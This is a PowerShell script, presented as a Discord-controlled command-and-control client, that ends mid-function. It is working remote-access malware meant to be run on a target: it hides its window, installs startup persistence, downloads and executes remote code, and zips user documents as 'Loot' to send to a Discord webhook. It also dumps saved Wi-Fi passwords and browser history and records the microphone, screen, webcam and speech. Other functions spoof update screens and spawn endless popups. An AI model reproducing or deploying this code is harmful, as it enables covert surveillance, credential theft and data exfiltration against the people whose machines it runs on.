<# ============================================= Beigeworm's Discord C2 Client ========================================================

**SYNOPSIS**
Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.

INFORMATION
This script will wait until it notices a change in the contents of a text file hosted online (eg. pastebin or github).
Every 10 seconds it will check a file for a change in the file contents and interpret it as a custom command / module.

** Using github to host your command file will take up to 5 minutes to run each module - Use https://pastebin.com and create an account to make an editable text file **

SETUP
1. Goto https://pastebin.com and make an account..
2. Create an empty paste/file and copy the RAW url.
3. Change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
4. Change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx

USAGE
1. Setup the script
2. Run the script on a target.
3. Check discord for 'waiting to connect..' message.
4. Edit the contents of your hosted file to contain 'options' to get a list of modules
5. Do the same with any other command listed - To run that module.

EXTRA
You can add custom scripting / commands - edit the hoted file to contain your custom powershell script.

Killswitch
Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
#>

# Uncomment the lines below and add your details
# $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
# $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx

# HIDE THE WINDOW - Change to 1 to hide the console window
$HideWindow = 1

If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
$Host.UI.RawUI.WindowTitle = 'hideme'
$Proc = (Get-Process | Where-Object {$_.MainWindowTitle -eq 'hideme'})
$hwnd = $Proc.MainWindowHandle
$Type::ShowWindowAsync($hwnd, 0)
}

# Check version and update
$version = "1.3.0"
$versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
$VBpath = "C:\Windows\Tasks\service.vbs"
if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
Write-Output "Persistance Installed - Checking Version.."
    if (!($version -match $versionCheck)){
        Write-Output "Newer version available! Downloading and Restarting"
        RemovePersistance
        AddPersistance
        $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
"@
        $tobat | Out-File -FilePath $VBpath -Force
        sleep 1
        & $VBpath
        exit
    }
}

# remove restart stager (if present)
if(Test-Path "C:\Windows\Tasks\service.vbs"){
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}

$version = "1.7.0" # Current Version
$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
$response = Invoke-RestMethod -Uri $GHurl
$previouscmd = $response

$noraw = $ghurl -replace "/raw", ""
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``Enter Commands Here`` - $noraw :link:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

Function Options{
$msgsys = "``========================================================
================== Discord C2 Options ==================
========================================================
= Commands List -                                      =
========================================================
= Message : Send a message window to the User          =
= SpeechToText  : Send audio transcript to Discord     =
= Screenshot  : Sends a screenshot of the desktop      =
= Keycapture   : Capture Keystrokes and send           =
= Exfiltrate : Send various files. (see ExtraInfo)     =
= Upload : Upload a file. (see ExtraInfo)              =
= Systeminfo : Send System info as text file.          =
= RecordAudio  : Record microphone to Discord          =
= RecordScreen  : Record Screen to Discord             =
= TakePicture : Send a webcam picture.                 =
= FolderTree : Save folder trees to file and send.     =
= FakeUpdate : Spoof windows update screen.            =
= AddPersistance : Add this script to startup.         =
= RemovePersistance : Remove from startup              =
= IsAdmin  : Check if the session is admin             =
= AttemptElevate : Attempt to restart script as admin  =
= EnumerateLAN  : Show devices on LAN (see ExtraInfo)  =
= NearbyWifi  : Show nearby wifi networks              =
= SendHydra  : Never ending popups (use killswitch)    =
= Close  : Close this Session                          =
========================================================
= Examples and Info -                                  =
========================================================
= __To Exit Exfiltrate or KeyCapture or SpeechToText__ =
= Edit your hosted file to contain 'kill'              =
= this will exit the current function eg. 'keycapture' =
========================================================``"
$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function ExtraInfo{
$msgsys = "``=========  Exfiltrate Command Examples ==================
= ( Exfiltrate -Path Documents -Filetype png )          =
= ( Exfiltrate -Filetype log )                          =
= ( Exfiltrate )                                        =
= Exfiltrate only will send many pre-defined filetypes  =
= from all User Folders like Documents, Downloads etc.. =
= ----------------------------------------------------- =
= PATH                                                  =
= Documents, Desktop, Downloads,                        =
= OneDrive, Pictures, Videos.                           =
= FILETYPE                                              =
= log, db, txt, doc, pdf, jpg, jpeg, png,               =
= wdoc, xdoc, cer, key, xls, xlsx,                      =
= cfg, conf, docx, rft.                                 =
===================  Upload Command Example =============
= ( Upload -Path C:/Path/To/File.txt )                  =
= Use 'Folder-Tree' command to show all files           =
=================  Enumerate-LAN Example ================
( Enumerate-LAN -Prefix 192.168.1. )                    =
This Eg. will scan 192.168.1.1 to 192.168.1.254         =
==================  Message Example =====================
( Message 'Your Message Here!' )                        =
================== Record Examples ======================
( RecordAudio -t 100 ) number of seconds to record      =
( RecordScreen -t 100 ) number of seconds to record     =
=========================================================``"
$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
sleep 1
curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
rm -Path $FilePath -Force
Write-Output "Done."
}

Function Message([string]$Message){
msg.exe * $Message
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function Upload{
param ([string[]]$Path)
if (Test-Path -Path $path){
    $extension = [System.IO.Path]::GetExtension($path)
    if ($extension -eq ".exe" -or $extension -eq ".msi") {
        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
        curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
        sleep 1
        Rm -Path $tempZipFilePath -Recurse -Force
    }else{
        curl.exe -F file1=@"$Path" $hookurl | Out-Null
    }
}
}

Function FakeUpdate {
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 3
Remove-Item -Path $pth -Force
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function NearbyWifi {
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Wifi``"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function EnumerateLAN{
param ([string]$Prefix)
if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
$FileOut = "$env:temp\Computers.csv"
1..255 | ForEach-Object {
    $ipAddress = "$Prefix.$_"
    Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
    }
$Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
             ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
             Select-Object IPv4, MAC
$Computers | Export-Csv $FileOut -NoTypeInformation
$data = Import-Csv $FileOut
$data | ForEach-Object {
    $mac = $_.'MAC'
    $apiUrl = "https://api.macvendors.com/$mac"
    $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
    Start-Sleep -Seconds 1
    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
    }
$data | Export-Csv $FileOut -NoTypeInformation
$data | ForEach-Object {
    try {
        $ip = $_.'IPv4'
        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
    } 
    catch {
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
    }
}
$data | Export-Csv $FileOut -NoTypeInformation
$results = Get-Content -Path $FileOut -Raw
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$results"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
rm -Path $FileOut
}

Function SendHydra {
Add-Type -AssemblyName System.Windows.Forms
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    function Create-Form {
        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close));return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = Invoke-RestMethod -Uri $GHurl
        if ($messages -match "kill") {
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function SpeechToText {
Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$grammar = New-Object System.Speech.Recognition.DictationGrammar
$speech.LoadGrammar($grammar)
$speech.SetInputToDefaultAudioDevice()

while ($true) {
    $result = $speech.Recognize()
    if ($result) {
        $results = $result.Text
        Write-Output $results
        $jsonsys = @{"username" = $env:COMPUTERNAME ; "content" = $results} | ConvertTo-Json
        irm -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body $jsonsys
    }
    $messages = Invoke-RestMethod -Uri $GHurl
    if ($messages -match "kill") {
    break
    }
}
}

Function RecordAudio{
param ([int[]]$t)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
iwr -Uri $url -OutFile $Path
}
sleep 1

Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
$id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName

$mp3Path = "$env:Temp\AudioClip.mp3"
if ($t.Length -eq 0){$t = 10}
.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
sleep 1
rm -Path $mp3Path -Force
}

Function RecordScreen{
param ([int[]]$t)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
iwr -Uri $url -OutFile $Path
}
sleep 1
$mkvPath = "$env:Temp\ScreenClip.mkv"
if ($t.Length -eq 0){$t = 10}
.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
sleep 1
rm -Path $mkvPath -Force
}

Function AddPersistance{
$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
sleep 1
if ($newScriptPath.Length -lt 100){
    "`$hookurl = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
    "`$ghurl = `"$ghurl`"" | Out-File -FilePath $newScriptPath -Force -Append
    "`$ccurl = `"$ccurl`"" | Out-File -FilePath $newScriptPath -Force -Append
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    sleep 1
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$tobat | Out-File -FilePath $pth -Force
rm -path "$env:TEMP\temp.ps1" -Force
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function RemovePersistance{
rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function Exfiltrate {
param ([string[]]$FileType,[string[]]$Path)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$maxZipFileSize = 25MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"
If($Path -ne $null){
$foldersToSearch = "$env:USERPROFILE\"+$Path
}else{
$foldersToSearch = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
}
If($FileType -ne $null){
$fileExtensions = "*."+$FileType
}else {
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
}
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
                Sleep 1
                Remove-Item -Path $zipFilePath -Force
                $index++
                $zipFilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }
            $entryName = $file.FullName.Substring($folder.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
            $currentZipSize += $fileSize
            $messages = Invoke-RestMethod -Uri $GHurl
            if ($messages -match "kill") {
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                $previouscmd = $response
                break
            }
        }
    }
}
$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
sleep 5
Remove-Item -Path $zipFilePath -Force
}

Function SystemInfo{
$userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$OSString = "$($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString = "Processor : $($processorInfo.Name)"
$systemString += "`nMemory : $RamInfo"
$systemString += "`nGpu : $($videocardinfo.Name)"
$systemString += "`nStorage : $Hddinfo"
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
$outpath = "$env:temp\systeminfo.txt"
$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime

$infomessage = "``========================================================

Current User    : $env:USERNAME
Email Address   : $email
Language        : $systemLanguage
Keyboard Layout : $keyboardLayoutID
Other Accounts  : $users
Public IP       : $computerPubIP
Current OS      : $OSString
Build           : $ver
Hardware Info
--------------------------------------------------------
$systemString``"

"--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $outpath -Encoding ASCII
"General Info `n $infomessage" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Network Info `n -----------------------------------------------------------------------`n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
"USB Info  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Processes  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Services `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

Sleep 1
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

curl.exe -F file1=@"$outpath" $hookurl | Out-Null
Sleep 1
Remove-Item -Path $outpath -force
}

Function IsAdmin{
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
    else{
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
}

Function AttemptElevate{
$tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
